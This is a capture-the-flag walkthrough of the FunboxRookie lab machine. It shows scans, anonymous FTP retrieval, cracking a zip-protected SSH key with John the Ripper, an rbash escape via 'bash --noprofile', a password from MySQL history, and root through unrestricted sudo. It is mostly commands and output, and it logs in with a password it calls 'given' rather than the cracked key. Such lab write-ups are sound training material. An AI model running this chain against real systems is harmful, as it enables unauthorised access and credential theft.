# FunboxRookie

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Difficulty: Easy
Community Rating: Easy
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 5
Lab Description:
In this lab, an anonymous FTP server leaks a password-protected archive containing a private SSH key. 
The key allows initial access to the system, which is further exploited by recovering user credentials 
from a MySQL history file. Privilege escalation is achieved by exploiting unrestricted sudo access 
for the user.
Released: 2 Nov 2020
```

Machine link: [https://portal.offsec.com/machine/funboxrookie-467/overview/details](https://portal.offsec.com/machine/funboxrookie-467/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ export TARGET_IP=192.168.230.107

┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ sudo nmap -sV -sC -p- $TARGET_IP             
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 12:42 CEST
Nmap scan report for 192.168.230.107
Host is up (0.034s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)
|   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)
|_  256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/logs/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.89 seconds
```

We have three services running:

- ProFTPD 1.3.5e on port 21
- OpenSSH 7.6p1 on port 22
- Apache httpd 2.4.29 on port 80

### Check the web site

Browsing manually to port 80 shows a `Apache2 Ubuntu Default Page`.  
Checking for comments with `nmap` show nothing interesting

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ nmap -v -p80 --script http-comments-displayer $TARGET_IP                         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 12:53 CEST
Happy 28th Birthday to Nmap, may it live to be 128!
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
Initiating Ping Scan at 12:53
Scanning 192.168.230.107 [4 ports]
Completed Ping Scan at 12:53, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:53
Completed Parallel DNS resolution of 1 host. at 12:53, 0.01s elapsed
Initiating SYN Stealth Scan at 12:53
Scanning 192.168.230.107 [1 port]
Discovered open port 80/tcp on 192.168.230.107
Completed SYN Stealth Scan at 12:53, 0.06s elapsed (1 total ports)
NSE: Script scanning 192.168.230.107.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.20s elapsed
Nmap scan report for 192.168.230.107
Host is up (0.030s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.230.107
|     
|     Path: http://192.168.230.107:80/
|     Line number: 201
|     Comment: 
|         <!--      <div class="table_of_contents floating_element">
|                 <div class="section_header section_header_grey">
|                   TABLE OF CONTENTS
|                 </div>
|                 <div class="table_of_contents_item floating_element">
|                   <a href="#about">About</a>
|                 </div>
|                 <div class="table_of_contents_item floating_element">
|                   <a href="#changes">Changes</a>
|                 </div>
|                 <div class="table_of_contents_item floating_element">
|                   <a href="#scope">Scope</a>
|                 </div>
|                 <div class="table_of_contents_item floating_element">
|                   <a href="#files">Config files</a>
|                 </div>
|               </div>
|         -->
|     
|     Path: http://192.168.230.107:80/
|     Line number: 4
|     Comment: 
|         <!--
|             Modified from the Debian original for Ubuntu
|             Last updated: 2016-11-16
|             See: https://launchpad.net/bugs/1288690
|_          -->

NSE: Script Post-scanning.
Initiating NSE at 12:53
Completed NSE at 12:53, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
```

The first nmap scan showed a robots.txt entry for `/logs/` but trying to access it gives as a 404-error

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ curl http://192.168.230.107/logs/                
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 192.168.230.107 Port 80</address>
</body></html>
```

Let's do a gobuster scan to search for additional files and directories

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 32 -x php,txt,html -u http://$TARGET_IP
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.230.107
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/.php                 (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 10918]
/robots.txt           (Status: 200) [Size: 17]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

### Access and download files on the FTP server

In the first nmap scan we saw a number of zip files available via anonymous FTP.  
Let's download and analyse them.

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ ftp $TARGET_IP                                                                               
Connected to 192.168.230.107.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.230.107]
Name (192.168.230.107:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.45.180 !
230-
230-The local time is: Mon Sep 01 11:20:12 2025
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||24523|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
-r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
226 Transfer complete
ftp> bin
200 Type set to I
ftp> mget *.msg
mget welcome.msg [anpqy?]? y
229 Entering Extended Passive Mode (|||16312|)
150 Opening BINARY mode data connection for welcome.msg (170 bytes)
100% |*******************************************************************************************************************************************|   170      318.03 KiB/s    00:00 ETA
226 Transfer complete
170 bytes received in 00:00 (5.34 KiB/s)
ftp> mget *.zip
mget jessica.zip [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||26756|)
150 Opening BINARY mode data connection for jessica.zip (1477 bytes)
100% |*******************************************************************************************************************************************|  1477        1.77 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (45.59 KiB/s)
229 Entering Extended Passive Mode (|||61671|)
150 Opening BINARY mode data connection for bud.zip (1477 bytes)
100% |*******************************************************************************************************************************************|  1477        2.22 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (46.31 KiB/s)
229 Entering Extended Passive Mode (|||9552|)
150 Opening BINARY mode data connection for marge.zip (1477 bytes)
100% |*******************************************************************************************************************************************|  1477      893.66 KiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (41.73 KiB/s)
229 Entering Extended Passive Mode (|||31037|)
150 Opening BINARY mode data connection for miriam.zip (1477 bytes)
100% |*******************************************************************************************************************************************|  1477        2.21 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (37.58 KiB/s)
229 Entering Extended Passive Mode (|||62381|)
150 Opening BINARY mode data connection for homer.zip (1477 bytes)
100% |*******************************************************************************************************************************************|  1477        2.39 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (46.11 KiB/s)
229 Entering Extended Passive Mode (|||53903|)
150 Opening BINARY mode data connection for john.zip (1477 bytes)
100% |*******************************************************************************************************************************************|  1477        2.59 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (45.39 KiB/s)
229 Entering Extended Passive Mode (|||22534|)
150 Opening BINARY mode data connection for cathrine.zip (1477 bytes)
100% |*******************************************************************************************************************************************|  1477      502.22 KiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (39.69 KiB/s)
229 Entering Extended Passive Mode (|||38588|)
150 Opening BINARY mode data connection for ariel.zip (1477 bytes)
100% |*******************************************************************************************************************************************|  1477        2.00 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (46.44 KiB/s)
229 Entering Extended Passive Mode (|||19921|)
150 Opening BINARY mode data connection for anna.zip (1477 bytes)
100% |*******************************************************************************************************************************************|  1477        2.21 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (43.33 KiB/s)
229 Entering Extended Passive Mode (|||12914|)
150 Opening BINARY mode data connection for tom.zip (1477 bytes)
100% |*******************************************************************************************************************************************|  1477        2.62 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (46.97 KiB/s)
229 Entering Extended Passive Mode (|||13645|)
150 Opening BINARY mode data connection for zlatan.zip (1477 bytes)
100% |*******************************************************************************************************************************************|  1477        2.02 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (46.66 KiB/s)
ftp> close
221 Goodbye.
ftp> quit
```

After downloading them we can check their contents

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ cat welcome.msg                  
Welcome, archive user %U@%R !

The local time is: %T

This is an experimental FTP server.  If you have any unusual problems,
please report them via e-mail to <root@%L>.


┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ file *.zip      
anna.zip:     Zip archive data, at least v2.0 to extract, compression method=deflate
ariel.zip:    Zip archive data, at least v2.0 to extract, compression method=deflate
bud.zip:      Zip archive data, at least v2.0 to extract, compression method=deflate
cathrine.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
homer.zip:    Zip archive data, at least v2.0 to extract, compression method=deflate
jessica.zip:  Zip archive data, at least v2.0 to extract, compression method=deflate
john.zip:     Zip archive data, at least v2.0 to extract, compression method=deflate
marge.zip:    Zip archive data, at least v2.0 to extract, compression method=deflate
miriam.zip:   Zip archive data, at least v2.0 to extract, compression method=deflate
tom.zip:      Zip archive data, at least v2.0 to extract, compression method=deflate
zlatan.zip:   Zip archive data, at least v2.0 to extract, compression method=deflate

┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ unzip anna.zip           
Archive:  anna.zip
[anna.zip] id_rsa password: 
   skipping: id_rsa                  incorrect password

┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ unzip ariel.zip 
Archive:  ariel.zip
[ariel.zip] id_rsa password: 
   skipping: id_rsa                  incorrect password

```

From the first nmap scan we could see that the `tom.zip` file had different file permissions so we focus on that

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ unzip tom.zip  
Archive:  tom.zip
[tom.zip] id_rsa password: 
   skipping: id_rsa                  incorrect password

┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ zip2john tom.zip                  
ver 2.0 efh 5455 efh 7875 tom.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
tom.zip/id_rsa:$pkzip$1*1*2*0*513*68b*39c551e6*0*40*8*513*554b*a9b5be6349270a2cf77e581b345a456eb98e3e205db75184c4a40b1082c7cf3a323c898fd94586f903e8bfe491d5bc3f7de9fb6363cefb8d9a7ee52e8eaa3ddac980970c852d8400146e30ae8003619f1c3338ae8690a560f9d35884bf92eb40704845cfec305e0344ff9a7fff87a35ecbe5ef65143c5478702f43068df59332a9375235b10db66598e84839dcb759c5bb083404571211a22516de88ab538a07e4211771b0bf87f96e8f0e1bed4eed48fabaff7258733821484f3e7231b1586da301d402d34696e2f72e7542bc9b114256cbc8d2fa38267274f4ce8823a8d90b52c5e4c7765d29cb2329b1647eff1e371cacc0f8fc1b5b7c97ab2f9ab30e261cdd0f93550f929b8e6f93abdacb5d38fe4c28da2af8bfe13284b986b2d3b886c0df0384c16d7df1621df33704cfe1a134d8d77b59a574710ded6c7233d8979f5b297887f190b5cd431f91ee494f0d92670d73c40544c89d91699d00cd01c4381811604ab35b67b53fcaa7805f4a612e2dec8cc41c7164f003de638ae85dd2e60a523f4c35d7157051ff90c62435bca03293eabdbff3e7a3412414a94ebd67a04cbeea311fff66ef3fb7aa944717ed9309c2dcb9ba042c4e9e9a46b375f11a997e1239f1750c8deca86cfd190535bac9f5576a05251e272af1b31d9cc406909401584980e4b79a1877b32043efe147522baef492ab2b0e2bc4b2282f06489f5efe9c780bad78dbae5200bf97119f7cf38ae9ed0a5a9b34ad13935389efad41e9ee348ad94ee370d08103d49334d97d8e5b0ba0820e4a2be7ac50e8d77f0d94a07741148bb36142935cc550f98409d4d1ec59fc94ef01bca3c28efa923294f4aed1c2f3d908277f08095ab498c7bb576d1a9f91bda5d414c79674ec66d1b1be5adc2b6a1d8afe98c1b5b62e69d72bcb902084fd7ba94192207088ec3e91c4a2688be9051eb86bd573c900a83fb75b9e62afa5b691efdb8fe62457dfc496804b6aaeff1df9f950452b35ffc20ffa0b9d9c8dde877aa381f0a6b347bab0b8ec4b15d3297fdf50572d82aa26a31c28dc0ea7cfd1ec966f1b43c9e3eae5befa484691990f2c7c802a40da3d2fa9fa23b91efcb8edc8e1a46cb73844729073b14889bd2fa31613293a8cf0185165de85e5dc51e74a0f901607c90c6d38543f670174c716a505017b6ec96e7acf376c2c8152bdb2cd0e01cbdd2883eb7b1ed21e0d2f014f46d7de3510d665ac44d3474316ea4059693c5926e570ad44f8dc17517b14e98375973bc4da912c50817c29d5f5bdcbbad590b48ee91297d73c62ca206ffd04fd4e44485c44595687bde8d4dc32fe84fde69833ab67442a3548ebe6ed7b57ffcb065f5e6d724a58d89a6a5165a48c8a75d5d9808c45ee1dfe888939db3d99b51ef8f65d275a0dd2e5bb3b608121b32e07a984ef3a713b7a3bbb952c6f5f907780c45cb7e9a447873e28f5f7113cebc3b142f232b4ed15f2df2362b4520e2fda8225780147723b0313aa010d8ea870c4f40fd90904d5f5ecb3199b8e65161ca38af20a7c9cae648e797a2df48013efc09099c42ede683da1261cbae695b0fe9bc901485d2fa9f5980f3ef2fa6a734f45b94447aadcb0029e815ae98d3e1d053cdde89a5242c6b8309b51f6a2c20f8535e84e755e82b9ed344c51ed75a804578eaeef4b5913207dc7a35fc8f755cc3cea806e8cfe968f4133eaf5c2851363c2497b4ba027cc40566bfb64f0ef77f8cf3093c13312f3eae32a6160aad96efbbdb9ea677fa6fb08a8ab40d7cad739c213bd7b5a9e6f8df839109371e461e4533a12ea3cb8e02a7a4dab2ad6eaeefbc421fbdd9f725e*$/pkzip$:id_rsa:tom.zip::tom.zip

┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ zip2john tom.zip > tom_zip.hash    
ver 2.0 efh 5455 efh 7875 tom.zip/id_rsa PKZIP Encr: TS_chk, cmplen=1299, decmplen=1675, crc=39C551E6 ts=554B cs=554b type=8
```

We will use John the Ripper and the rockyou wordlist to try to crack it

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt tom_zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iubire           (tom.zip/id_rsa)     
1g 0:00:00:00 DONE (2025-09-01 13:28) 12.50g/s 204800p/s 204800c/s 204800C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ unzip tom.zip 
Archive:  tom.zip
[tom.zip] id_rsa password: 
  inflating: id_rsa   
```

And there we have tom's private SSH-key.

### Login as tom via SSH

We also try to login with SSH using our given credentials (`tom:xx11yy22!`)

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ ssh tom@$TARGET_IP                            
The authenticity of host '192.168.230.107 (192.168.230.107)' can't be established.
ED25519 key fingerprint is SHA256:ZBER3N78DusT56jsi/IGcAxcCB2W5CZWUJTbc3K4bZc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.230.107' (ED25519) to the list of known hosts.
tom@192.168.230.107's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-117-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep  1 11:06:35 UTC 2025

  System load:  0.08              Processes:             201
  Usage of /:   74.9% of 4.37GB   Users logged in:       0
  Memory usage: 42%               IP address for ens256: 192.168.230.107
  Swap usage:   0%


30 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@funbox2:~$ 
```

And we have access!

### Get the user flag

Now we can start looking for the user flag

```bash
tom@funbox2:~$ find / -type f -name user.txt 2>/dev/null 
-rbash: /dev/null: restricted: cannot redirect output
tom@funbox2:~$ cat /etc/passwd | grep tom
tom:x:1000:1000:tom:/home/tom:/bin/rbash
tom@funbox2:~$ 
```

We are running in a restricted rbash shell!

However, we can still read the user flag without problem

```bash
tom@funbox2:~$ ls
local.txt
tom@funbox2:~$ cat local.txt
3<REDACTED>2
```

### Escape the rbash shell

To escape the rbash shell we can login without the profile

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Play/FunboxRookie]
└─$ ssh tom@$TARGET_IP -t "bash --noprofile"
tom@192.168.230.107's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@funbox2:~$ echo 'escaped?' > temp.txt
tom@funbox2:~$ 
```

This time we get no errors using redirections!

### Enumeration for privesc

Next, we enumerate the system for privilege escalation opportunities.

First we check our local files

```bash
tom@funbox2:~$ ls -la
total 48
drwxr-xr-x 5 tom  tom  4096 Sep  1 11:33 .
drwxr-xr-x 3 root root 4096 Jul 25  2020 ..
-rw------- 1 tom  tom   131 Sep  1 11:31 .bash_history
-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tom  tom  3771 Apr  4  2018 .bashrc
drwx------ 2 tom  tom  4096 Sep  1 11:06 .cache
drwx------ 3 tom  tom  4096 Jul 25  2020 .gnupg
-rw-r--r-- 1 tom  tom    33 Sep  1 10:39 local.txt
-rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history
-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
drwx------ 2 tom  tom  4096 Jul 25  2020 .ssh
-rw-rw-r-- 1 tom  tom     9 Sep  1 11:33 temp.txt
tom@funbox2:~$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
tom@funbox2:~$ 
```

The insert line looks like the password we already have.

Next, we check if we can run commands with `sudo`

```bash
tom@funbox2:~$ sudo -l 
[sudo] password for tom: 
Matching Defaults entries for tom on funbox2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
tom@funbox2:~$ 
```

Wow, that was easy. We can run every command as root with `sudo`

We can get an interactive session with `sudo -i`

```bash
tom@funbox2:~$ sudo -i
root@funbox2:~# id
uid=0(root) gid=0(root) groups=0(root)
root@funbox2:~# 
```

### Get the root flag

Finally we get the root flag

```bash
root@funbox2:~# ls -l /root
total 8
-rw-r--r-- 1 root root 32 Oct 14  2020 flag.txt
-rw------- 1 root root 33 Sep  1 10:39 proof.txt
root@funbox2:~# cat /root/proof.txt 
0<REDACTED>8
root@funbox2:~# 
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [file - Linux manual page](https://man7.org/linux/man-pages/man1/file.1.html)
- [John the Ripper - Homepage](https://www.openwall.com/john/)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH  - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [rbash restricted shell escape](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/)
- [robots.txt - Wikipedia](https://en.wikipedia.org/wiki/Robots.txt)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [The Restricted Shell - Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
